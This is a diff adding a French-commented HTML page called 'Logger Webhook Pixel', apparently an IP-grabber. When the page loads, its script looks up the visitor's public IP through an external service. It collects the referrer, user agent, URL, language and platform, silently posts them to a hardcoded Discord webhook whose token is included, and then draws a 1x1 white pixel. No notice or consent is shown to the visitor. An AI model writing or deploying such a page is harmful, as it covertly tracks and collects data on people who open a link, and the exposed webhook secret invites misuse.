@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Logger Webhook Pixel</title>
+</head>
+<body>
+<script>
+(async function() {
+  // Récupérer l'IP publique via un service externe
+  async function getPublicIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || 'unknown';
+    } catch {
+      return 'unknown';
+    }
+  }
+
+  // Préparer les données à logger
+  const logEntry = {
+    timestamp: new Date().toISOString(),
+    ip: await getPublicIP(),
+    referer: document.referrer || 'unknown',
+    user_agent: navigator.userAgent || 'unknown',
+    additional_info: {
+      url: window.location.href,
+      path: window.location.pathname,
+      search: window.location.search,
+      method: 'GET', // côté client, c'est toujours GET
+      hostname: window.location.hostname,
+      language: navigator.language,
+      platform: navigator.platform,
+      cookies_enabled: navigator.cookieEnabled
+    }
+  };
+
+  // Remplacer cette URL par l'URL de ton webhook
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377390162979586200/L1rq4N6vDSP8alDZhv9vAfxzZ97CXCUIS8OYxl_bniGVp3Fm80eVHbyGk3AExZc_VuWS";
+
+  // Envoi des données au webhook
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(logEntry)
+  });
+
+  // Génération d'une image 1x1 pixel blanche
+  const canvas = document.createElement('canvas');
+  canvas.width = 1;
+  canvas.height = 1;
+  const ctx = canvas.getContext('2d');
+  ctx.fillStyle = "#fff";
+  ctx.fillRect(0, 0, 1, 1);
+  document.body.appendChild(canvas); // Optionnel : afficher le pixel
+})();
+</script>
+</body>
+</html>
